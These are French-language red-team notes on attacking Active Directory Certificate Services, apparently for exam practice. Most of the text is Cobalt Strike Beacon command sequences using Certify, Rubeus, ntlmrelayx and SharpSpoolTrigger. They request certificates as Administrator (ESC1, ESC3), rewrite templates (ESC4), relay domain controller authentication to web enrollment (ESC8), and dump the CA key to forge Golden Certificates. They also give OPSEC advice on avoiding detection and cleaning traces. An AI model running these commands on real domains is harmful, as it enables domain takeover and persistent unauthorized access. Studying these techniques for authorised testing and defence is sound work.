# Active Directory Certificate Services (AD CS)

Basé sur **Certified Pre-Owned (2021)**. Sujet : Privilege Escalation et Persistence liées aux mauvaises configurations AD CS.

> Toute utilisation de `execute-assembly` est classée **OPSEC-CAUTION** dans ces notes : fork & run crée un processus temporaire.
> Les notes recommandent d'enchaîner Certify et Rubeus lorsque c'est possible afin de limiter les créations de processus.

---

## Énumération

```cs
// Enumerate CAs — check for ESC8 web enrollment, vulnerable CA flags
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --quiet

// Enumerate vulnerable templates only — suppress admin-only findings
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```

**Points à rechercher dans les résultats des certificate templates :**
| Flag | Signification |
|------|-------------|
| `ENROLLEE_SUPPLIES_SUBJECT` | Le demandeur contrôle le SAN → possibilité d'ESC1 |
| `Manager Approval = False` | Aucune validation manuelle requise |
| `Authorized Signatures = 0` | Aucune cosignature requise |
| EKU : `Client Authentication` | Certificat utilisable pour l'authentification Kerberos |
| EKU : `Certificate Request Agent` | Peut signer une demande au nom d'un autre utilisateur → ESC3 |
| EKU : `Any Purpose` ou vide | Pas de restriction d'usage → ESC2 |

---

## ESC1 — Client Authentication Templates mal configurés

**Conditions :** EKU Client Authentication + `ENROLLEE_SUPPLIES_SUBJECT` + absence de Manager Approval + droits d'enrollment pour des comptes peu privilégiés.

```cs
// Step 1: Request cert specifying target UPN in SAN
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template ESC1 \
  --upn Administrator \
  --quiet

// Output: base64 PFX — use directly with Rubeus

// Step 2: Use cert to get TGT as target user
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
  /user:Administrator \
  /domain:CONTOSO.COM \
  /certificate:<base64_pfx> \
  /enctype:aes256 \
  /nowrap
```

---

## ESC2 — Templates avec Any Purpose ou EKU vide

**Conditions :** EKU `Any Purpose` (OID `2.5.29.37.0`) ou champ EKU vide (considéré comme SubCA).

```cs
// Enumerate (same command — output will show Any Purpose EKU)
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

// If ENROLLEE_SUPPLIES_SUBJECT is set → abuse as ESC1
// If not set → abuse as ESC3 (use as agent cert to sign requests on behalf of others)
```

---

## ESC3 — Certificate Request Agent Templates mal configurés

**Conditions :** EKU `Certificate Request Agent` actif, aucune Manager Approval et droits d'enrollment peu restreints.

Exploitation en deux étapes : obtenir un certificat agent, puis l'utiliser pour demander un certificat au nom d'un autre utilisateur.

```cs
// Step 1: Request agent certificate using current user context
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template ESC3 \
  --quiet

// Step 2: Use agent cert to request a Client Auth cert on behalf of Administrator
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request-agent \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template User \
  --target Administrator \
  --agent-pfx <base64_agent_pfx> \
  --quiet

// Step 3: Use resulting cert with Rubeus asktgt (same as ESC1 Step 2)
```

---

## ESC4 — Contrôle d'accès aux Certificate Templates (ACE)

**Conditions :** un principal peu privilégié dispose sur un template d'un droit Owner, FullControl, WriteOwner, WriteProperty ou WriteDacl.

```cs
// Identify via enum-templates output — look for non-admin principals with write perms
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

// Modify template to add ENROLLEE_SUPPLIES_SUBJECT (then exploit as ESC1)
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template \
  --template ESC4 \
  --supply-subject \
  --quiet

// Other manage-template flags:
//   --enroll <sid>               → grant self enrollment rights
//   --manager-approval           → toggle approval requirement
//   --authorized-signatures 0    → remove signature requirement
//   --client-auth / --pkinit-auth / --smartcard-logon → toggle auth EKUs
```

> Après modification du template, poursuivre avec l'exploitation ESC1.
> **Restaurer ensuite le template** pour limiter les traces et les pénalités OPSEC lors de l'examen.

---

## ESC8 — NTLM Relay vers AD CS HTTP Web Enrollment

**Conditions :** la CA expose Web Enrollment (`http://<ca>/certsrv/`) sans protection HTTPS et avec Channel Binding désactivé.

**Vérification :**
```cs
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
```

**Chaîne d'attaque :** NTLM Relay de l'authentification DC → certificat DC → S4U2self vers Domain Admin.

### 1. Vérifier l'écoute du port 445 (PID 4 = kernel)
```cs
// OPSEC-SAFE (BOF)
beacon> netstat
```

### 2. Désactiver le redémarrage automatique de lanmanserver puis arrêter les services dans l'ordre
```cs
// OPSEC-CAUTION — modifies service config, generates event logs
beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
beacon> sc_stop lanmanserver
beacon> sc_stop srv2
beacon> sc_stop srvnet
```

> **Attention :** libérer le port 445 interrompt les partages SMB et les SMB Beacons de cette machine.
> Ne pas effectuer cette manipulation sur un serveur critique ou une machine hébergeant un SMB Beacon.

### 3. Vérifier que le port 445 est libre
```cs
beacon> netstat
```

### 4. Configurer un reverse port forward (trafic 445 vers ntlmrelayx local sur le port 7445)
```cs
// OPSEC-SAFE (Beacon native)
beacon> rportfwd_local 445 localhost 7445
```

### 5. Démarrer un SOCKS proxy pour permettre à ntlmrelayx d'atteindre AD CS
```cs
// OPSEC-SAFE (Beacon native)
beacon> socks 1080 socks5
```

### 6. Depuis Kali, lancer ntlmrelayx (container Docker, port 7445 mappé vers 445)
```bash
proxychains impacket-ntlmrelayx \
  -t http://10.10.120.5/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

### 7. Déclencher l'authentification DC avec SharpSpoolTrigger
```cs
// OPSEC-CAUTION — triggers SpoolSS auth coercion from DC
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe \
  <DC_IP> \
  <compromised_host_IP>
```

### 8. ntlmrelayx récupère le relay → certificat PFX DC → utilisation avec Rubeus
```cs
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
  /user:<DC_account> \
  /domain:CONTOSO.COM \
  /certificate:<base64_pfx> \
  /enctype:aes256 \
  /nowrap
// Then S4U2self to get DA service tickets
```

### Cleanup — Restauration
```cs
beacon> rportfwd stop 445
beacon> socks stop
// Re-enable lanmanserver start type manually if needed
```

---

## DPERSIST1 — Golden Certificates (récupération de la clé CA)

**Conditions :** disposer d'un Shell ou Beacon sur le serveur CA (accès Tier 0).

> Les notes rapprochent cette attaque du vol de `krbtgt`. Les certificats forgés peuvent rester valides jusqu'à expiration, même après un changement de mot de passe.

```cs
// Step 1: Confirm you're on the CA
// OPSEC-UNSAFE (spawns cmd.exe child) — use getenv or hostname BOF if available
beacon> run hostname

// Step 2: Dump CA keypair as base64 PFX
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet

// Step 3: Save PFX to attacker machine
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\contoso-root-ca.pfx", [Convert]::FromBase64String("<base64>"))
```

```cs
// Step 4: Forge cert offline (run on attacker Windows box — no beacon needed)
// OPSEC-SAFE (offline, no network activity)
C:\Tools\Certify\Certify\bin\Release\Certify.exe forge \
  --ca-cert .\Desktop\contoso-root-ca.pfx \
  --upn Administrator \
  --subject "CN=Administrator,CN=Users,DC=contoso,DC=com" \
  --sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500 \
  --crl "ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com" \
  --quiet
```

```cs
// Step 5: Use forged cert with Rubeus asktgt
// OPSEC-CAUTION
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
  /user:Administrator \
  /domain:CONTOSO.COM \
  /certificate:<forged_base64_pfx> \
  /enctype:aes256 \
  /nowrap
```

> Le certificat forgé reste valable jusqu'à sa date de fin. Sa révocation n'a d'effet que si les contrôles CRL détectent son numéro de série, selon les conditions décrites. Une clé CA compromise doit être traitée comme une compromission majeure du domaine.

---

## Récapitulatif OPSEC

| Technique | Niveau | Remarques |
|-----------|------|-------|
| `enum-cas` / `enum-templates` | CAUTION | `execute-assembly` crée un processus temporaire |
| Demande ESC1 | CAUTION | `execute-assembly` ; demande enregistrée sur la CA (Events 4886/4887) |
| ESC3 request-agent | CAUTION | Deux demandes de certificat et deux entrées dans les logs CA |
| ESC4 manage-template | CAUTION | Modification du template enregistrée dans AD |
| ESC8 rportfwd_local | SAFE | Fonction native Beacon, sans child process |
| ESC8 socks | SAFE | Fonction native Beacon |
| ESC8 sc_stop services | CAUTION | Événements d'arrêt de service (7036), interruption SMB |
| ESC8 SharpSpoolTrigger | CAUTION | Authentification forcée produisant du trafic réseau |
| DPERSIST1 dump-certs | CAUTION | Exécution sur la CA, cible sensible et surveillée |
| DPERSIST1 forge (offline) | SAFE | Pas d'activité Beacon ou réseau |
| Rubeus asktgt avec certificat | CAUTION | Demande TGT via PKINIT, Event 4768 |

**Events CA à connaître :**
- `4886` — Demande de certificat reçue
- `4887` — Certificat émis
- `4888` — Demande refusée

---

## Référence des OID EKU

| OID | Désignation |
|-----|------|
| `1.3.6.1.5.5.7.3.2` | Client Authentication |
| `1.3.6.1.5.5.7.3.1` | Server Authentication |
| `1.3.6.1.5.5.7.3.4` | Secure Email |
| `1.3.6.1.4.1.311.10.3.4` | EFS |
| `2.5.29.37.0` | Any Purpose (exploitation via ESC2) |
| *(vide)* | Considéré comme une Subordinate CA, sans restriction |
